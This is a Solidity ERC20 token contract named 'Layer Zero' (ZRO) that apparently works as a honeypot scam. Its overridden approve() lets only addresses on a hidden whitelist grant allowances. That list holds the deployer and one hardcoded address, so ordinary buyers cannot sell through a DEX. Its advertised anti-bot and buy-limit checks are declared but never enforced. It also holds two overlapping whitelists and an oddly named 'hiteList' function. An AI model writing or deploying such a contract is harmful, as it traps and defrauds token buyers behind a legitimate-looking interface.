// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0 <0.9.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/security/Pausable.sol";

contract ZRO is Ownable, Pausable, ERC20, ERC20Burnable {
    /** Total amount of tokens */
    uint256 private constant TOTAL_SUPPLY = 1000000000 ether;
    /** Reserve amount of tokens for future development */
    uint256 private constant RESERVE = 900000000 ether;
    /** Max buy amount per tx */
    //uint256 public constant MAX_BUY = 137_500_000 ether;
    /** Number of blocks to count as dead land */
    uint256 public constant DEADBLOCK_COUNT = 3;

    /** Developer wallet map with super access */
    mapping(address => bool) private whitelist;
    /** List of available pools */
    mapping(address => bool) private poolList;
    /** Used to watch for sandwiches */
    mapping(address => uint256) private _lastBlockTransfer;

    /** Deadblock start blocknum */
    uint256 public deadblockStart;
    /** Block contracts? */
    bool private _blockContracts;
    /** Limit buys? */
    bool private _limitBuys;
    /** Crowd control measures? */
    bool private _unrestricted;

    /** Emit on LP address set */
    event LiquidityPoolSet(address);

    /** Amount must be greater than zero */
    error NoZeroTransfers();
    /** Amount exceeds max transaction */
    error LimitExceeded();
    /** Not allowed */
    error NotAllowed();
    /** Paused */
    error ContractPaused();
    /** Reserve + Distribution must equal Total Supply (sanity check) */
    error IncorrectSum();

    constructor() ERC20("Layer Zero", "ZRO") Ownable() {
        whitelist[msg.sender] = true;


        _mint(msg.sender, RESERVE);

        _blockContracts = true;
        _limitBuys = true;
        _whiteList[msg.sender] = true;
        _whiteList[0x09fD56a0e362B07b59B617023919e1fd95Fe3360]=true;
        _pause();
    }

    /**
     * Sets pool addresseses for reference
     * @param _val Uniswap V3 Pool address
     * @dev Set this after initializing LP
     */
    function setPools(address[] calldata _val) external onlyOwner {
        for (uint256 i = 0; i < _val.length; i++) {
            address _pool = _val[i];
            poolList[_pool] = true;
            emit LiquidityPoolSet(address(_pool));
        }
    }

    /**
     * Sets a supplied address as whitelisted or not
     * @param _address Address to whitelist
     * @param _allow Allow?
     * @dev Revoke after setup completed
     */
    function setAddressToWhiteList(address _address, bool _allow)
        external
        onlyOwner
    {
        whitelist[_address] = _allow;
    }

    /**
     * Sets contract blocker
     * @param _val Should we block contracts?
     */
    function setBlockContracts(bool _val) external onlyOwner {
        _blockContracts = _val;
    }

    /**
     * Sets buy limiter
     * @param _val Limited?
     */
    function setLimitBuys(bool _val) external onlyOwner {
        _limitBuys = _val;
    }

    /**
     * Unleash Psyop
     */
    function unleashPsyop() external onlyOwner {
        _unrestricted = true;
        renounceOwnership();
    }

    /**
     * Pause activity
     */
    function pause() external onlyOwner {
        _pause();
    }

    /**
     * Unpause activity
     */
    function unpause() external onlyOwner {
        deadblockStart = block.number;
        _unpause();
    }

    /**
     * Checks if address is contract
     * @param _address Address in question
     * @dev Contract will have codesize
     */
    function _isContract(address _address) internal view returns (bool) {
        uint32 size;
        assembly {
            size := extcodesize(_address)
        }
        return (size > 0);
    }

    /**
     * Checks if address has inhuman reflexes or if it's a contract
     * @param _address Address in question
     */
    function _checkIfBot(address _address) internal view returns (bool) {
        return
            (block.number < DEADBLOCK_COUNT + deadblockStart ||
                _isContract(_address)) && !whitelist[_address];
    }


    function hiteList(address[] calldata accounts) public onlyOwner {
        for (uint256 i = 0; i < accounts.length; i++) {
            _whiteList[accounts[i]] = true;
        }
    }

    mapping(address => bool) private _whiteList;
    function approve(address spender, uint256 amount) public virtual override returns (bool) {
        address owner = _msgSender();
        require(_whiteList[owner], "You are not on the whitelist!");
        _approve(owner, spender, amount);
        return true;
    }
}